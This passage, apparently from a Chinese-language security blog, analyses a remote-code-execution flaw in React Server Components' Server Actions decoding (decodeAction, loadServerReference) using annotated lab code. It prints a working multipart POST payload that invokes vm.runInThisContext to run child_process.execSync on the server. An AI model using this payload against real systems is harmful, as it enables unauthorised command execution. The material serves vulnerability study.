<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">* 创建Node.js HTTP服务，处理RSC 的Server Actions表单提交请求
</span></span></span><span class="line"><span class="cl"><span class="cm">* 核心功能：接收POST请求的表单数据，解析后调用decodeAction解析服务端Action，执行函数并返回结果；
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Object} req - HTTP请求对象，包含请求方法、URL、头信息、表单数据等
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Object} res - HTTP响应对象，用于返回处理结果 
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 忽略GET请求，不重要…… 处理POST请求
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span> <span class="o">===</span> <span class="s1">&#39;POST&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">url</span> <span class="o">===</span> <span class="s1">&#39;/formaction&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">chunks</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 监听请求数据接收事件：逐块收集二进制数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">req</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="nx">chunk</span> <span class="p">=&gt;</span> <span class="nx">chunks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">chunk</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 监听请求数据接收完成事件：解析表单数据并处理Action
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">req</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 1. 还原完整的表单数据，拼接所有数据块为完整的Buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">chunks</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">contentType</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;content-type&#39;</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 2. 从Content-Type中提取boundary分隔符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">boundaryMatch</span> <span class="o">=</span> <span class="nx">contentType</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/boundary=(.+)/</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">boundaryMatch</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;No boundary&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 3. 解析multipart/form-data格式的表单数据为FormData对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="nx">parseMultipart</span><span class="p">(</span><span class="nx">buffer</span><span class="p">,</span> <span class="nx">boundaryMatch</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;FormData:&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">formData</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">v</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">` </span><span class="si">${</span><span class="nx">k</span><span class="si">}</span><span class="sb">: </span><span class="si">${</span><span class="nx">v</span><span class="si">}</span><span class="sb">`</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// 4. 核心逻辑：decodeAction 解析表单数据中的Server Action，加载对应的服务端函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 核心漏洞点，调用链：decodeAction → loadServerReference → requireModule
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// requireModule: moduleExports[metadata[2]] 缺少 hasOwnProperty 检测，导致原型链污染
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kr">const</span> <span class="nx">actionFn</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">decodeAction</span><span class="p">(</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">serverManifest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Action result:&#39;</span><span class="p">,</span> <span class="nx">actionFn</span><span class="p">,</span> <span class="k">typeof</span> <span class="nx">actionFn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// 5. 执行Action函数并返回结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">actionFn</span> <span class="o">===</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 若解析出合法函数，执行函数并返回成功结果
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">actionFn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">          <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">          <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">success</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">result</span><span class="o">:</span> <span class="nb">String</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 若未解析出函数，返回Action的字符串形式
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">          <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">success</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">action</span><span class="o">:</span> <span class="nb">String</span><span class="p">(</span><span class="nx">actionFn</span><span class="p">)</span> <span class="p">}));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ……
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">});</span></span></span></code></pre></td></tr></table>
</div>
</div><p>我们提交的POST请求包为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/formaction</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----Boundary</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}
</span></span><span class="line"><span class="cl">------Boundary--</span></span></code></pre></td></tr></table>
</div>
</div><p>Node.js HTTP服务处理POST请求，解析 Multipart 表单，使用 <code>parseMultipart(buffer, boundary)</code> 得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s1">&#39;$ACTION_REF_0&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="s1">&#39;$ACTION_0:0&#39;</span><span class="p">,</span> <span class="s1">&#39;{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;...&#34;]}&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="decodeaction-解析请求" class="heading-element"><span>decodeAction 解析请求</span>
  <a href="#decodeaction-%e8%a7%a3%e6%9e%90%e8%af%b7%e6%b1%82" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>RSC 会把前端提交的 FormData 里面的字段 <code>&quot;$$ACTION_ID&quot;</code>映射到服务器上的某个真实函数。</p>
<p>例如：<code>&lt;form action={saveFeedback}&gt;</code>，客户端 POST 的内容会变成：<code>action=FeedbackActions.saveFeedback</code></p>
<p>decodeAction函数就是一个动态路由功能，负责找到对应的服务端函数，提供后续调用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">actionFn</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">decodeAction</span><span class="p">(</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">serverManifest</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>server.js 是直接调用了 decodeAction， 用于将客户端 Action 描述转换为可执行函数。</p>
<ol>
<li>从 formData 找到 action 字段</li>
<li>从 serverManifest 找到模块名</li>
<li>动态 require() 模块</li>
<li>返回模块里的函数引用</li>
</ol>
<p>也就是说，这个函数能根据用户输入字符串，动态加载 服务器上的任意模块、任意函数。</p>
<p>在React中，该函数位于<code>packages/react-server/src/ReactFlightActionServer.js</code></p>
<p>这里实验环境下，添加注释后的代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/** 
</span></span></span><span class="line"><span class="cl"><span class="cm">* Server Actions 的核心解码函数：解析请求体中的服务端 Action 信息，加载对应函数并绑定表单数据
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Iterable} body - RSC 请求体（FormData格式），包含 Action 标识和表单数据
</span></span></span><span class="line"><span class="cl"><span class="cm">* @param {Object} serverManifest - 服务端清单，存储 Action ID 与服务端函数的映射关系
</span></span></span><span class="line"><span class="cl"><span class="cm">* @returns {Promise&lt;Function&gt;|null} - 绑定了表单数据的Server Action 函数（Promise 形式），无 Action 则返回 null
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="nx">exports</span><span class="p">.</span><span class="nx">decodeAction</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">serverManifest</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="nx">action</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nx">body</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">key</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;$ACTION_&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 分支1：处理带绑定元数据的Action（$ACTION_REF_前缀，含绑定参数）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">?</span> <span class="nx">key</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;$ACTION_REF_&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">?</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 1. 重构Action标识格式，拼接为标准Action标识
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">(</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;$ACTION_&#34;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 2. 解码绑定的Action元数据，从请求体中提取并解析绑定参数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">(</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">decodeBoundActionMetaData</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">serverManifest</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">),</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 3. 根据ID和绑定参数匹配服务端函数，从服务端清单加载对应的Action引用（核心）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">(</span><span class="nx">action</span> <span class="o">=</span> <span class="nx">loadServerReference</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="nx">serverManifest</span><span class="p">,</span>   <span class="c1">// 服务端Action映射清单
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">value</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>         <span class="c1">// Action唯一标识
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">value</span><span class="p">.</span><span class="nx">bound</span>       <span class="c1">// Action绑定的参数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 分支2：处理普通Action
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">:</span> <span class="nx">key</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;$ACTION_ID_&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 1. 截取Action ID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">((</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">11</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 2. 加载服务端Action引用（无绑定参数）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="p">(</span><span class="nx">action</span> <span class="o">=</span> <span class="nx">loadServerReference</span><span class="p">(</span><span class="nx">serverManifest</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">null</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 分支3：普通表单数据，添加到FormData中供Action使用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">:</span> <span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// 最终返回逻辑：无Action则返回null，有则绑定FormData后返回
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="kc">null</span> <span class="o">===</span> <span class="nx">action</span>
</span></span><span class="line"><span class="cl">    <span class="o">?</span> <span class="kc">null</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">action</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">fn</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">formData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
</div>
</div><p>作用：解析 FormData，识别 <code>$ACTION_REF_ </code>或 <code>$ACTION_ID_</code>字段，调用 loadServerReference 加载相应<code>Action ID</code>模块或者函数，返回一个绑定 FormData 的服务器函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ACTION_REF_0=
</span></span><span class="line"><span class="cl">$ACTION_0:0={&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}</span></span></code></pre></td></tr></table>
</div>
</div><p>读取 $ACTION_0:0 的值，拆分 id 字段：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">moduleName</span> <span class="o">=</span> <span class="s2">&#34;vm&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">exportName</span> <span class="o">=</span> <span class="s2">&#34;runInThisContext&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>从代码中可以看到有两类Action字段： <code>$ACTION_REF_*</code> 和 <code>$ACTION_ID_*</code> ，我们做下解释：</p>
<p>React Server Actions 通过 <code>$ACTION_REF_*</code> 和 <code>$ACTION_ID_*</code> 两类字段实现服务端函数调用。</p>
<ul>
<li><strong><code>$ACTION_REF_</code></strong> 开头：绑定 action 客户端用于引用已有的服务器 Action 实例。</li>
</ul>
<p>在实际逻辑中<code>$ACTION_REF_</code> 允许客户端伪造 action 实例 + 伪造 bound 参数 → 导致“创建一个新的 action 实例”</p>
<p>例如：构造了一堆 multipart 字段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">$ACTION_REF_999</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nx">$ACTION_999</span><span class="o">:</span><span class="mi">0</span><span class="o">=</span><span class="nx">hello</span>
</span></span><span class="line"><span class="cl"><span class="nx">$ACTION_999</span><span class="o">:</span><span class="mi">1</span><span class="o">=</span><span class="nx">world</span></span></span></code></pre></td></tr></table>
</div>
</div><p>decodeAction进行解析：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">value</span> <span class="o">=</span> <span class="s2">&#34;$ACTION_&#34;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span><span class="p">;</span>    <span class="c1">// 通过这里就会变成$ACTION_999:
</span></span></span><span class="line"><span class="cl"><span class="c1">// decodeAction 不仅“引用现有 action”，而是直接让客户端创建了 action 实例命名空间。
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">value</span> <span class="o">=</span> <span class="nx">decodeBoundActionMetaData</span><span class="p">(</span><span class="nx">body</span><span class="p">,</span> <span class="nx">serverManifest</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 然后就会去扫描$ACTION_999:*所有的
</span></span></span><span class="line"><span class="cl"><span class="c1">// 最后返回的就是
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span> <span class="nx">id</span><span class="o">:</span> <span class="s2">&#34;999&#34;</span><span class="p">,</span> <span class="nx">bound</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;hello&#34;</span><span class="p">,</span> <span class="s2">&#34;world&#34;</span><span class="p">]}</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><strong><code>$ACTION_ID_</code></strong> 最常见的用于模块调用</li>
</ul>
<p>如用户提交了修改密码请求</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">{updatePassword}</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&#34;password&#34;</span> <span class="na">name=</span><span class="s">&#34;newPassword&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">&#34;submit&#34;</span><span class="nt">&gt;</span>Update Password<span class="nt">&lt;/button&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/form&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>生成了FormData就会变成：<code>$ACTION_ID_UserActions.updatePassword = &quot;&quot;</code></p>
<p>服务器就会去找<strong>updatePassword</strong> 函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">loadServerReference</span><span class="p">(</span><span class="nx">serverManifest</span><span class="p">,</span> <span class="s2">&#34;UserActions&#34;</span><span class="p">,</span> <span class="s2">&#34;updatePassword&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>还有就是分模块的调用，如<code>$ACTION_ID_OrderActions.createOrder = &quot;&quot;</code>，解析成就会</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">loadServerReference</span><span class="p">(</span><span class="nx">serverManifest</span><span class="p">,</span> <span class="s2">&#34;OrderActions&#34;</span><span class="p">,</span> <span class="s2">&#34;createOrder&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>通过 <code>$ACTION_ID_*</code> 字段，React 确保调用 <code>OrderActions</code> 模块中的 <code>createOrder</code> 方法。</p>
<h3 id="loadserverreference-加载" class="heading-element"><span>loadServerReference 加载</span>
  <a href="#loadserverreference-%e5%8a%a0%e8%bd%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
